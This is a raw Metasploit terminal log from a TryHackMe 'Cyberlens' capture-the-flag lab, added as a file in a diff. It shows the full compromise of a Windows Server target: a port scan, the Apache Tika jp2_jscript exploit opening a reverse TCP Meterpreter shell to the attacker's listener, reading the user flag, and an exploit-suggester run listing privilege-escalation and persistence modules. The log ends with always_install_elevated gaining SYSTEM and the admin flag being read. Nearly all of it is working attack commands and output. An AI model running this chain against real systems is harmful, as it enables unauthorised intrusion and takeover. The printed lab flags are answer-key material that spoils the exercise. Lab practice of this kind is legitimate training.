@@ -1,0 +1,392 @@
+                                                                                                                                                                                                              
+┌──(sonar㉿Kali)-[/run/…/sonar/SANDISK/TryHackMe/Cyberlens]
+└─$ msfconsole
+Metasploit tip: Use the edit command to open the currently active module 
+in your editor
+                                                  
+
+      .:okOOOkdc'           'cdkOOOko:.                                                                                                                                                                         
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                                                                                                       
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                                                                                                      
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                                                                                                     
+  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                                                                                                                                     
+  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                                                                                                                                     
+  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                                                                                                                                     
+  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                                                                                                                                     
+   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc                                                                                                                                                                      
+    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                                                                                                                                       
+     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                                                                                                                                        
+      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;                                                                                                                                                                         
+       .dOOo   .OOOOocccxOOOO.   xOOd.                                                                                                                                                                          
+         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                                                                                                                                            
+           :kk;.OOOOOOOOOOOOO.cOk:                                                                                                                                                                              
+             ;kOOOOOOOOOOOOOOOk:                                                                                                                                                                                
+               ,xOOOOOOOOOOOx,                                                                                                                                                                                  
+                 .lOOOOOOOl.                                                                                                                                                                                    
+                    ,dOd,                                                                                                                                                                                       
+                      .                                                                                                                                                                                         
+
+       =[ metasploit v6.5.2-dev                                 ]
++ -- --=[ 2,677 exploits - 1,341 auxiliary - 2,599 payloads     ]
++ -- --=[ 436 post - 57 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > set RHOSTS 10.48.146.178
+RHOSTS => 10.48.146.178
+msf > use auxiliary/scanner/portscan/tcp
+msf auxiliary(scanner/portscan/tcp) > show options
+
+Module options (auxiliary/scanner/portscan/tcp):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   CONCURRENCY  10               yes       The number of concurrent ports to check per host
+   DELAY        0                yes       The delay between connections, per thread, in milliseconds
+   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
+   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
+   RHOSTS       10.48.146.178    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   THREADS      1                yes       The number of concurrent threads (max one per host)
+   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
+
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(scanner/portscan/tcp) > use exploit/windows/http/apache_tika_jp2_jscript
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/http/apache_tika_jp2_jscript) > show options
+
+Module options (exploit/windows/http/apache_tika_jp2_jscript):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni, socks4, socks5, socks5h
+   RHOSTS     10.48.146.178    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      9998             yes       The target port (TCP)
+   SRVHOST                     no        The local host to listen on and use for incoming connections
+   SRVSSL     false            no        Negotiate SSL/TLS for local server connections
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The base path to the web application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVPORT  8080             yes       The local port to listen on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.5.92     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/http/apache_tika_jp2_jscript) > set RPORT 61777
+RPORT => 61777
+msf exploit(windows/http/apache_tika_jp2_jscript) > set LHOST 192.168.141.83
+LHOST => 192.168.141.83
+msf exploit(windows/http/apache_tika_jp2_jscript) > run
+[*] Started reverse TCP handler on 192.168.141.83:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. Target is vulnerable based on version: 1.17
+[*] Sending PUT request to 10.48.146.178:61777/meta
+[*] Command Stager progress -  82.46% done (7999/9701 bytes)
+[*] Sending PUT request to 10.48.146.178:61777/meta
+[*] Command Stager progress - 100.00% done (9701/9701 bytes)
+[*] Sending stage (203454 bytes) to 10.48.146.178
+[*] Meterpreter session 1 opened (192.168.141.83:4444 -> 10.48.146.178:49833) at 2026-08-27 11:05:24 +0530
+
+meterpreter > ls
+^C[-] ls: Interrupted
+meterpreter > getuid
+Server username: CYBERLENS\CyberLens
+meterpreter > cd C:\\Users\\CyberLens
+meterpreter > ls
+Listing: C:\Users\CyberLens
+===========================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+040555/r-xr-xr-x  0        dir   2023-06-07 01:18:33 +0530  3D Objects
+040777/rwxrwxrwx  0        dir   2018-11-14 21:47:25 +0530  AppData
+040777/rwxrwxrwx  0        dir   2023-06-07 01:18:22 +0530  Application Data
+040555/r-xr-xr-x  0        dir   2023-06-07 01:18:33 +0530  Contacts
+040777/rwxrwxrwx  0        dir   2023-06-07 01:18:22 +0530  Cookies
+040555/r-xr-xr-x  4096     dir   2023-06-07 01:23:54 +0530  Desktop
+040555/r-xr-xr-x  4096     dir   2023-06-07 08:39:00 +0530  Documents
+040555/r-xr-xr-x  0        dir   2023-06-07 01:18:33 +0530  Downloads
+040555/r-xr-xr-x  0        dir   2023-06-07 01:18:33 +0530  Favorites
+040555/r-xr-xr-x  0        dir   2023-06-07 01:18:33 +0530  Links
+040777/rwxrwxrwx  0        dir   2023-06-07 01:18:22 +0530  Local Settings
+040555/r-xr-xr-x  0        dir   2023-06-07 01:18:33 +0530  Music
+040777/rwxrwxrwx  0        dir   2023-06-07 01:18:22 +0530  My Documents
+100666/rw-rw-rw-  786432   fil   2023-10-11 15:53:14 +0530  NTUSER.DAT
+100666/rw-rw-rw-  1048576  fil   2023-11-25 13:01:21 +0530  NTUSER.DAT{a057f24b-e827-11e8-81c0-0a917f905606}.TxR.0.regtrans-ms
+100666/rw-rw-rw-  1048576  fil   2023-11-25 13:01:21 +0530  NTUSER.DAT{a057f24b-e827-11e8-81c0-0a917f905606}.TxR.1.regtrans-ms
+100666/rw-rw-rw-  1048576  fil   2023-11-25 13:01:22 +0530  NTUSER.DAT{a057f24b-e827-11e8-81c0-0a917f905606}.TxR.2.regtrans-ms
+100666/rw-rw-rw-  65536    fil   2023-11-25 13:01:21 +0530  NTUSER.DAT{a057f24b-e827-11e8-81c0-0a917f905606}.TxR.blf
+100666/rw-rw-rw-  65536    fil   2023-06-07 01:22:36 +0530  NTUSER.DAT{a057f24c-e827-11e8-81c0-0a917f905606}.TM.blf
+100666/rw-rw-rw-  524288   fil   2023-06-07 01:18:21 +0530  NTUSER.DAT{a057f24c-e827-11e8-81c0-0a917f905606}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288   fil   2023-06-07 01:18:21 +0530  NTUSER.DAT{a057f24c-e827-11e8-81c0-0a917f905606}.TMContainer00000000000000000002.regtrans-ms
+040777/rwxrwxrwx  0        dir   2023-06-07 01:18:22 +0530  NetHood
+040555/r-xr-xr-x  0        dir   2023-06-07 01:18:33 +0530  Pictures
+040777/rwxrwxrwx  0        dir   2023-06-07 01:18:22 +0530  PrintHood
+040777/rwxrwxrwx  0        dir   2023-06-07 01:18:22 +0530  Recent
+040555/r-xr-xr-x  0        dir   2023-06-07 01:18:33 +0530  Saved Games
+040555/r-xr-xr-x  0        dir   2023-06-07 01:18:33 +0530  Searches
+040777/rwxrwxrwx  0        dir   2023-06-07 01:18:22 +0530  SendTo
+040777/rwxrwxrwx  0        dir   2023-06-07 01:18:22 +0530  Start Menu
+040777/rwxrwxrwx  0        dir   2023-06-07 01:18:22 +0530  Templates
+040555/r-xr-xr-x  0        dir   2023-06-07 01:18:33 +0530  Videos
+100666/rw-rw-rw-  180224   fil   2023-06-07 01:18:21 +0530  ntuser.dat.LOG1
+100666/rw-rw-rw-  274432   fil   2023-06-07 01:18:21 +0530  ntuser.dat.LOG2
+100666/rw-rw-rw-  20       fil   2018-11-14 21:47:25 +0530  ntuser.ini
+
+meterpreter > cd Desktop
+meterpreter > ls
+Listing: C:\Users\CyberLens\Desktop
+===================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  527   fil   2016-06-21 21:06:17 +0530  EC2 Feedback.website
+100666/rw-rw-rw-  554   fil   2016-06-21 21:06:23 +0530  EC2 Microsoft Windows Guide.website
+100666/rw-rw-rw-  282   fil   2023-06-07 01:18:33 +0530  desktop.ini
+100666/rw-rw-rw-  25    fil   2023-06-07 01:24:19 +0530  user.txt
+
+meterpreter > cat user.txt
+THM{T1k4-CV3-f0r-7h3-w1n}meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(windows/http/apache_tika_jp2_jscript) > search exploit suggester
+
+Matching Modules
+================
+
+   #  Full Name                                 Disclosure Date  Rank    Check  Name
+   -  ---------                                 ---------------  ----    -----  ----
+   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester
+   1  post/multi/recon/persistence_suggester    .                normal  No     Persistence Exploit Suggester
+
+
+Interact with a module by name or index. For example info 1, use 1 or use post/multi/recon/persistence_suggester
+
+msf exploit(windows/http/apache_tika_jp2_jscript) > use post/multi/recon/local_exploit_suggester
+msf post(multi/recon/local_exploit_suggester) > options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+
+View the full module info with the info, or info -d command.
+
+msf post(multi/recon/local_exploit_suggester) > run
+[-] Post failed: Msf::OptionValidateError One or more options failed to validate: SESSION.
+msf post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
+msf post(multi/recon/local_exploit_suggester) > run
+[*] 10.48.146.178 - Collecting local exploits for x86/windows...
+[*] 10.48.146.178 - 260 exploit checks are being tried...
+[+] 10.48.146.178 - exploit/windows/local/always_install_elevated: The target is vulnerable. Target is vulnerable
+[+] 10.48.146.178 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable. Windows Server 2019 appears vulnerable
+[+] 10.48.146.178 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable. Version Windows Server 2019 appears vulnerable
+[+] 10.48.146.178 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable. Version Windows Server 2019 appears vulnerable
+[+] 10.48.146.178 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable. Version Windows Server 2019 appears vulnerable
+[+] 10.48.146.178 - exploit/windows/local/ikeext_service: The target appears to be vulnerable. Target appears vulnerable
+[+] 10.48.146.178 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. Windows session with multiple CPU cores detected
+[+] 10.48.146.178 - exploit/windows/persistence/bits: The target is vulnerable. Likely exploitable
+[+] 10.48.146.178 - exploit/windows/persistence/powershell_profile: The target appears to be vulnerable. Powershell execution policy for CurrentUser (Undefined), will attempt to override
+[+] 10.48.146.178 - exploit/windows/persistence/registry: The target is vulnerable. Registry writable
+[+] 10.48.146.178 - exploit/windows/persistence/registry_active_setup: The target is vulnerable. Registry writable
+[+] 10.48.146.178 - exploit/windows/persistence/service_for_user/lock_unlock: The target appears to be vulnerable. Target is likely exploitable
+[+] 10.48.146.178 - exploit/windows/persistence/service_for_user/logon: The target appears to be vulnerable. Target is likely exploitable
+[+] 10.48.146.178 - exploit/windows/persistence/service_for_user/schedule: The target appears to be vulnerable. Target is likely exploitable
+[+] 10.48.146.178 - exploit/windows/persistence/startup_folder: The target appears to be vulnerable. Likely exploitable, able to write test file to C:\Users\CyberLens\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+[+] 10.48.146.178 - exploit/windows/persistence/userinit_mpr_logon_script: The target is vulnerable. Registry path is writable
+[*] Running check method for exploit 62 / 62
+[*] 10.48.146.178 - Valid modules for session 1:
+============================
+
+ #   Name                                                              Potentially Vulnerable?  Check Result
+ -   ----                                                              -----------------------  ------------
+ 1   exploit/windows/local/always_install_elevated                     Yes                      The target is vulnerable. Target is vulnerable
+ 2   exploit/windows/local/bypassuac_comhijack                         Yes                      The target appears to be vulnerable. Windows Server 2019 appears vulnerable
+ 3   exploit/windows/local/bypassuac_sluihijack                        Yes                      The target appears to be vulnerable. Version Windows Server 2019 appears vulnerable
+ 4   exploit/windows/local/cve_2020_1048_printerdemon                  Yes                      The target appears to be vulnerable. Version Windows Server 2019 appears vulnerable
+ 5   exploit/windows/local/cve_2020_1337_printerdemon                  Yes                      The target appears to be vulnerable. Version Windows Server 2019 appears vulnerable
+ 6   exploit/windows/local/ikeext_service                              Yes                      The target appears to be vulnerable. Target appears vulnerable
+ 7   exploit/windows/local/ms16_032_secondary_logon_handle_privesc     Yes                      The service is running, but could not be validated. Windows session with multiple CPU cores detected
+ 8   exploit/windows/persistence/bits                                  Yes                      The target is vulnerable. Likely exploitable
+ 9   exploit/windows/persistence/powershell_profile                    Yes                      The target appears to be vulnerable. Powershell execution policy for CurrentUser (Undefined), will attempt to override                                                                                                                                                                                                          
+ 10  exploit/windows/persistence/registry                              Yes                      The target is vulnerable. Registry writable
+ 11  exploit/windows/persistence/registry_active_setup                 Yes                      The target is vulnerable. Registry writable
+ 12  exploit/windows/persistence/service_for_user/lock_unlock          Yes                      The target appears to be vulnerable. Target is likely exploitable
+ 13  exploit/windows/persistence/service_for_user/logon                Yes                      The target appears to be vulnerable. Target is likely exploitable
+ 14  exploit/windows/persistence/service_for_user/schedule             Yes                      The target appears to be vulnerable. Target is likely exploitable
+ 15  exploit/windows/persistence/startup_folder                        Yes                      The target appears to be vulnerable. Likely exploitable, able to write test file to C:\Users\CyberLens\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup                                                                                                                                                            
+ 16  exploit/windows/persistence/userinit_mpr_logon_script             Yes                      The target is vulnerable. Registry path is writable
+ 17  exploit/multi/persistence/ssh_key                                 No                       The target is not exploitable. sshd_config file not found
+ 18  exploit/windows/local/adobe_sandbox_adobecollabsync               No                       Cannot reliably check exploitability. Unable to determine target state
+ 19  exploit/windows/local/agnitum_outpost_acs                         No                       The target is not exploitable. Target is not vulnerable
+ 20  exploit/windows/local/anyconnect_lpe                              No                       The target is not exploitable. vpndownloader.exe not found on file system
+ 21  exploit/windows/local/bits_ntlm_token_impersonation               No                       The target is not exploitable. Session lacks required SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
+ 22  exploit/windows/local/bthpan                                      No                       The target is not exploitable. Target is not vulnerable
+ 23  exploit/windows/local/bypassuac_eventvwr                          No                       The target is not exploitable. Version Windows Server 2019 is not vulnerable
+ 24  exploit/windows/local/bypassuac_fodhelper                         No                       The target is not exploitable. Version Windows Server 2019 is not vulnerable
+ 25  exploit/windows/local/canon_driver_privesc                        No                       The target is not exploitable. No Canon TR150 driver directory found
+ 26  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move      No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!                                                                                                                                                                                                               
+ 27  exploit/windows/local/gog_galaxyclientservice_privesc             No                       The target is not exploitable. Galaxy Client Service not found
+ 28  exploit/windows/local/ipass_launch_app                            No                       The target is not exploitable. Target is not vulnerable
+ 29  exploit/windows/local/lenovo_systemupdate                         No                       The target is not exploitable. Target is not vulnerable
+ 30  exploit/windows/local/lexmark_driver_privesc                      No                       The check failed for unknown reasons.
+ 31  exploit/windows/local/mqac_write                                  No                       The target is not exploitable. Target is not vulnerable
+ 32  exploit/windows/local/ms10_015_kitrap0d                           No                       The target is not exploitable. Target is not vulnerable
+ 33  exploit/windows/local/ms10_092_schelevator                        No                       The target is not exploitable. Windows Server 2019 (10.0 Build 17763). is not vulnerable
+ 34  exploit/windows/local/ms13_053_schlamperei                        No                       The target is not exploitable. Revision 1 is not vulnerable
+ 35  exploit/windows/local/ms13_081_track_popup_menu                   No                       Cannot reliably check exploitability. Unable to determine target state
+ 36  exploit/windows/local/ms14_058_track_popup_menu                   No                       Cannot reliably check exploitability. Unable to determine target state
+ 37  exploit/windows/local/ms14_070_tcpip_ioctl                        No                       The target is not exploitable. Target is not vulnerable
+ 38  exploit/windows/local/ms15_004_tswbproxy                          No                       The target is not exploitable. Version Windows Server 2019 is not vulnerable
+ 39  exploit/windows/local/ms15_051_client_copy_image                  No                       The target is not exploitable. Build 17763 is not vulnerable
+ 40  exploit/windows/local/ms16_016_webdav                             No                       The target is not exploitable. Target is not vulnerable
+ 41  exploit/windows/local/ms16_075_reflection                         No                       The target is not exploitable. Target is not vulnerable
+ 42  exploit/windows/local/ms16_075_reflection_juicy                   No                       The target is not exploitable. Target is not vulnerable
+ 43  exploit/windows/local/ms_ndproxy                                  No                       The target is not exploitable. Target is not vulnerable
+ 44  exploit/windows/local/novell_client_nicm                          No                       The target is not exploitable. Target is not vulnerable
+ 45  exploit/windows/local/ntapphelpcachecontrol                       No                       The check failed for unknown reasons.
+ 46  exploit/windows/local/ntusermndragover                            No                       The target is not exploitable. Version Windows Server 2019 is not vulnerable
+ 47  exploit/windows/local/panda_psevents                              No                       The target is not exploitable. Target is not vulnerable
+ 48  exploit/windows/local/ppr_flatten_rec                             No                       The target is not exploitable. Revision 1 is not vulnerable
+ 49  exploit/windows/local/ricoh_driver_privesc                        No                       The target is not exploitable. No Ricoh driver directory found
+ 50  exploit/windows/local/tokenmagic                                  No                       The target is not exploitable. Version Windows Server 2019 is not vulnerable
+ 51  exploit/windows/local/virtual_box_guest_additions                 No                       The target is not exploitable. Target is not vulnerable
+ 52  exploit/windows/local/webexec                                     No                       The target is not exploitable. Target is not vulnerable
+ 53  exploit/windows/persistence/accessibility_features_debugger       No                       The target is not exploitable. You have admin rights to run this Module
+ 54  exploit/windows/persistence/assistive_technology                  No                       The target is not exploitable. You have admin rights to run this Module
+ 55  exploit/windows/persistence/notepadpp_plugin                      No                       The target is not exploitable. Notepad++ is probably not present
+ 56  exploit/windows/persistence/registry_userinit                     No                       The target is not exploitable. Unable to read registry path HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon with key Userinit                                                                                                                                                                                        
+ 57  exploit/windows/persistence/service                               No                       The target is not exploitable. You must be System/Admin to run this Module
+ 58  exploit/windows/persistence/task_scheduler                        No                       The target is not exploitable. You need higher privileges to create scheduled tasks
+ 59  exploit/windows/persistence/wmi/wmi_event_subscription_event_log  No                       The target is not exploitable. This module requires admin privs to run
+ 60  exploit/windows/persistence/wmi/wmi_event_subscription_interval   No                       The target is not exploitable. This module requires admin privs to run
+ 61  exploit/windows/persistence/wmi/wmi_event_subscription_process    No                       The target is not exploitable. This module requires admin privs to run
+ 62  exploit/windows/persistence/wmi/wmi_event_subscription_uptime     No                       The target is not exploitable. This module requires admin privs to run
+
+[*] Post module execution completed
+msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/always_install_elevated 
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/local/always_install_elevated) > show options
+
+Module options (exploit/windows/local/always_install_elevated):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  -1               yes       The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.5.92     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/local/always_install_elevated) > set SESSION 1
+SESSION => 1
+msf exploit(windows/local/always_install_elevated) > show options
+
+Module options (exploit/windows/local/always_install_elevated):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.5.92     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/local/always_install_elevated) > set LHOST 192.168.141.83
+LHOST => 192.168.141.83
+msf exploit(windows/local/always_install_elevated) > run
+[*] Started reverse TCP handler on 192.168.141.83:4444 
+[*] Uploading the MSI to C:\Users\CYBERL~1\AppData\Local\Temp\1\kgnQexALKom.msi ...
+[*] Executing MSI...
+[*] Sending stage (203454 bytes) to 10.48.146.178
+[+] Deleted C:\Users\CYBERL~1\AppData\Local\Temp\1\kgnQexALKom.msi
+[*] Meterpreter session 2 opened (192.168.141.83:4444 -> 10.48.146.178:49920) at 2026-08-27 11:12:04 +0530
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > cd C:\\Users||Administrator
+[-] stdapi_fs_chdir: Operation failed: The filename, directory name, or volume label syntax is incorrect.
+meterpreter > cd C:\\Users\\Administrator
+meterpreter > cd Desktop
+meterpreter > ls
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  527   fil   2016-06-21 21:06:17 +0530  EC2 Feedback.website
+100666/rw-rw-rw-  554   fil   2016-06-21 21:06:23 +0530  EC2 Microsoft Windows Guide.website
+100666/rw-rw-rw-  24    fil   2023-11-28 01:20:45 +0530  admin.txt
+100666/rw-rw-rw-  282   fil   2021-03-17 20:43:27 +0530  desktop.ini
+
+meterpreter > cat admin.txt
+THM{3lev@t3D-4-pr1v35c!}meterpreter > exit
+[*] Shutting down session: 2
+
+[*] 10.48.146.178 - Meterpreter session 2 closed.  Reason: User exit
+msf exploit(windows/local/always_install_elevated) > exit
+[*] You have active sessions open, to exit anyway type "exit -y"
+msf exploit(windows/local/always_install_elevated) > exit -y
+^C^C                                                                     
